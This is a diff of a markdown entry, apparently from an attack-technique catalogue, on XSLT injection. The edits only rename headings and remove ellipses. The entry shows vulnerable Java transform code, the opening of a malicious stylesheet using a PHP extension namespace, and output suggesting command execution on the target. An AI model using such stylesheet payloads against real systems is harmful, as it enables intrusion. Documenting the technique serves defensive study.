@@ -7,7 +7,7 @@ A threat actor may interfere with an application's processing of extensible styl
 2. The target's XSLT processor parses the malicious file (Based on the processor and the version of the XSLT specification)
 
 ## Code
-#### Target Logic
+#### Target-Logic
 ```java
 ...
 Result result = new StreamResult(System.out);
@@ -19,7 +19,7 @@ transformer.transform(xml, result);
 ...
 ```
 
-#### Target-in
+#### Target-In
 ```
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xs>
   <xsl:template match="/">
@@ -30,8 +30,6 @@ transformer.transform(xml, result);
 
 #### Target-Out
 ```
-...
-...
 usystem01
 ```
 
